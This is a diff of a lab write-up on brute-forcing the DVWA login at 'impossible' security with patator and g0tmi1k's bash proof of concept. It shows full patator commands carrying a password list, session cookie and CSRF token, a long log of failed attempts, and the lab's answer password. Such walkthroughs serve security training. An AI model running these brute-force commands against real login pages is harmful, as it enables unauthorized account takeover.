@@ -238,10 +238,6 @@ N.B - It is possible to use things like Burp Suite Macros to help us get around 
                    <img width="1200px" src="https://github.com/user-attachments/assets/5a56298b-c8da-44ee-b654-05c8131fee2c"><br><br>
                    <img width="1200px" src="https://github.com/user-attachments/assets/d374c291-4120-46de-8dc2-897e8e6e5a0f"><br></h6>
 
-```bash
-patator http_fuzz method=POST --threads=64 timeout=10 url="http://10.201.76.76/login.php" 0=passwords.txt body="username=admin&password=FILE0&Login=Login&user_token=70d5a777a1d13f532d6edbba6c3c4071 header="Cookie: PHPSESSID=69dr414b9i2kvao0mk74drkb3r; security=impossible" -x quit:fgrep!=login.php
-```
-
 <br>
 <h2>Task 5 . Brute forcing - Patator</h2>
 <p>So we tried with Burp Suite - But it turns out this isn't the right tool for this job.<br>
@@ -326,77 +322,67 @@ Add the -x ignore: action to the end of your existing patator command (right aft
 <p>5.1. What action can we use to show only the correct password (the answer includes '  ')?<br>
 <code>-x ignore:fgrep='Location: login.php'</code></p>
 
-<br>
-
-<p>5.2. What is the admin password?<br>
-<code>1qaz@WSX</code></p>
-
-<br>
-
-
 ```bash
-:~/BruteForceHeroes# apt install patator
-```
-
-```bash
-:~/BruteForceHeroes# :~/BruteForceHeroes# patator -h
+:~/BruteForceHeroes# patator http_fuzz method=POST --threads=64 timeout=10 url="http://10.201.76.76/login.php" 0=/root/BruteForceHeroes/passwords.txt body="username=admin&password=FILE0&Login=Login&user_token=70d5a777a1d13f532d6edbba6c3c4071/login.php" header="Cookie: PHPSESSID=69dr414b9i2kvao0mk74drkb3r; security=impossible" -x ignore:fgrep='Location:login.php'
 ...
-Available modules:
-  + ftp_login     : Brute-force FTP
-  + ssh_login     : Brute-force SSH
-  + telnet_login  : Brute-force Telnet
-  + smtp_login    : Brute-force SMTP
-  + smtp_vrfy     : Enumerate valid users using SMTP VRFY
-  + smtp_rcpt     : Enumerate valid users using SMTP RCPT TO
-  + finger_lookup : Enumerate valid users using Finger
-  + http_fuzz     : Brute-force HTTP
-  + ajp_fuzz      : Brute-force AJP
-  + pop_login     : Brute-force POP3
-  + pop_passd     : Brute-force poppassd (http://netwinsite.com/poppassd/)
-  + imap_login    : Brute-force IMAP4
-  + ldap_login    : Brute-force LDAP
-  + smb_login     : Brute-force SMB
-  + smb_lookupsid : Brute-force SMB SID-lookup
-  + rlogin_login  : Brute-force rlogin
-  + vmauthd_login : Brute-force VMware Authentication Daemon
-  + mssql_login   : Brute-force MSSQL
-  + oracle_login  : Brute-force Oracle
-  + mysql_login   : Brute-force MySQL
-  + mysql_query   : Brute-force MySQL queries
-  + rdp_login     : Brute-force RDP (NLA)
-  + pgsql_login   : Brute-force PostgreSQL
-  + vnc_login     : Brute-force VNC
-  + dns_forward   : Forward DNS lookup
-  + dns_reverse   : Reverse DNS lookup
-  + snmp_login    : Brute-force SNMP v1/2/3
-  + ike_enum      : Enumerate IKE transforms
-  + unzip_pass    : Brute-force the password of encrypted ZIP files
-  + keystore_pass : Brute-force the password of Java keystore files
-  + sqlcipher_pass : Brute-force the password of SQLCipher-encrypted databases
-  + umbraco_crack : Crack Umbraco HMAC-SHA1 password hashes
-  + tcp_fuzz      : Fuzz TCP services
-  + dummy_test    : Testing module
+23:35:53 patator    FAIL - xxx  89:-1         27.675 | 123456                             |     1 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
+23:35:53 patator    FAIL - xxx  89:-1         27.784 | 123456789                          |     3 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
+23:35:53 patator    FAIL - xxx  89:-1         27.777 | password                           |     4 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
+23:35:53 patator    FAIL - xxx  89:-1         27.755 | iloveyou                           |     5 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
+23:35:53 patator    FAIL - xxx  89:-1         27.734 | rockyou                            |     8 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
+23:35:53 patator    FAIL - xxx  89:-1         27.681 | 12345678                           |     9 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
+23:35:53 patator    FAIL - xxx  89:-1         27.737 | abc123                             |    10 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
+23:35:53 patator    FAIL - xxx  89:-1         27.696 | nicole                             |    11 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
+23:35:53 patator    FAIL - xxx  89:-1         27.631 | monkey                             |    14 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
+23:35:53 patator    FAIL - xxx  89:-1         27.668 | lovely                             |    15 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
+23:35:53 patator    FAIL - xxx  89:-1         27.681 | jessica                            |    16 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
+23:35:53 patator    FAIL - xxx  89:-1         27.678 | 654321                             |    17 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
+23:35:53 patator    FAIL - xxx  89:-1         27.664 | michael                            |    18 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
+23:35:53 patator    FAIL - xxx  89:-1         27.668 | ashley                             |    19 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
+23:35:53 patator    FAIL - xxx  89:-1         27.769 | qwerty                             |    20 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
+23:35:53 patator    FAIL - xxx  89:-1         27.768 | 111111                             |    21 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
+23:35:53 patator    FAIL - xxx  89:-1         27.759 | 000000                             |    23 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
+23:35:53 patator    FAIL - xxx  89:-1         27.755 | michelle                           |    24 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
+23:35:53 patator    FAIL - xxx  89:-1         27.731 | tigger                             |    25 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
+23:35:53 patator    FAIL - xxx  89:-1         27.742 | sunshine                           |    26 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
+23:35:53 patator    FAIL - xxx  89:-1         27.724 | chocolate                          |    27 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
+23:35:53 patator    FAIL - xxx  89:-1         27.711 | password1                          |    28 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
+23:35:53 patator    FAIL - xxx  89:-1         27.709 | anthony                            |    30 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
+23:35:53 patator    FAIL - xxx  89:-1         27.703 | butterfly                          |    32 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
+23:35:53 patator    FAIL - xxx  89:-1         27.680 | purple                             |    33 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
+23:35:53 patator    FAIL - xxx  89:-1         27.717 | liverpool                          |    36 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
+23:35:53 patator    FAIL - xxx  89:-1         27.704 | justin                             |    37 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
+23:35:53 patator    FAIL - xxx  89:-1         27.694 | loveme                             |    38 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
+23:35:53 patator    FAIL - xxx  89:-1         27.717 | 123123                             |    39 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
+23:35:53 patator    FAIL - xxx  89:-1         27.685 | secret                             |    41 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
+23:35:53 patator    FAIL - xxx  89:-1         27.613 | jennifer                           |    44 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
+23:35:53 patator    FAIL - xxx  89:-1         27.627 | joshua                             |    45 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
+23:35:53 patator    FAIL - xxx  89:-1         27.604 | superman                           |    48 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
+23:35:53 patator    FAIL - xxx  89:-1         27.606 | hannah                             |    49 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
+23:35:53 patator    FAIL - xxx  89:-1         27.617 | loveyou                            |    51 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
+23:35:53 patator    FAIL - xxx  89:-1         27.629 | pretty                             |    52 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
+23:35:53 patator    FAIL - xxx  89:-1         27.607 | basketball                         |    53 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
+23:35:53 patator    FAIL - xxx  89:-1         27.608 | angels                             |    55 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
+23:35:53 patator    FAIL - xxx  89:-1         27.588 | tweety                             |    56 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
+23:35:57 patator    FAIL - xxx  89:-1         30.651 | andrew                             |    54 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
+23:35:57 patator    FAIL - xxx  89:-1         30.639 | flower                             |    57 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
+23:35:57 patator    FAIL - xxx  89:-1         30.655 | playboy                            |    58 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
+23:35:57 patator    FAIL - xxx  89:-1         30.649 | elizabeth                          |    60 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
+23:35:57 patator    FAIL - xxx  89:-1         30.642 | tinkerbell                         |    62 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
+23:35:57 patator    FAIL - xxx  89:-1         30.644 | charlie                            |    63 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
+23:35:57 patator    FAIL - xxx  89:-1         30.652 | samantha                           |    64 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
+clear
+...
 ```
 
-<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/3a10bbd8-8efa-44a8-978e-b4c26c62cc69"></p>
-
-<p>
-
-- Method: <code>POST</code><br>
-- Cookie: <code>PHPSESSID=45eu1udsigp66r4dacbk2d14o7; security=impossible</code><br>
-- Data: <code>username=admin&password=password&Login=Login&user_token=642ad57c2e23f5ad18648f8798c1fb41</code><br>
-- Exit Condition: <ode>Location: login.php</code></p>
+<img width="1084" height="455" alt="image" src="https://github.com/user-attachments/assets/95cbba7c-82ec-4979-af54-1826e176fafa" />
 
 <br>
-
-<h3>Patator</h3>
-<p>Did not work</p>
-
 <br>
-
-<h3>gotm1lk</h3>
 <p>
-    
+
+- waited for a loooooooooong time for patator execution ... FAIL ... FAIL ... FAIL<br>
+- decided to use gotm1lk instead<br>    
 - navigated to https://<coe>blog.g0tmi1k.com/dvwa/login/</code></p>
 
 <p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/51c62612-58e6-45b9-abf4-1564e0dfe08c"></p>
@@ -406,7 +392,7 @@ Available modules:
 - <code>passwords.txt</code> is the Task File downloaded<br>
 - <code>user.txt</code> is a file containing <code>admin</code></p>
 
-<p align="center"><em>PoC</em></p>
+<p align="center"><em>g0tmi1k´s <code>PoC</code></em></p>
 
 ```bash
 #!/bin/bash
@@ -465,7 +451,12 @@ done < ${PASS_LIST}
 rm -f /tmp/dvwa.cookie
 ```
 
-<p><code>admin</code> : <code>1qaz@WSX</code></p>
+<p>5.2. What is the admin password?<br>
+<code>1qaz@WSX</code></p>
+
+<p>
+    
+- <code>admin</code> : <code>1qaz@WSX</code></p>
 
 ```bash
 :~/BruteForceHeroes# ./PoC
@@ -479,7 +470,7 @@ rm -f /tmp/dvwa.cookie
 <p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/e4f34daf-e280-4141-b711-b53a0da0f8d2"></p>
 
 <br>
-
+<br>
 <h2>Task 6 . Brute forcing - ZAP</h2>
 <p>Congratulations! Not only did you brute force the main login for the admin, but you did it while the security was set to "Impossible" - If this is your first time brute forcing be impressed with yourself, time for tea and medals all round.<br>
 
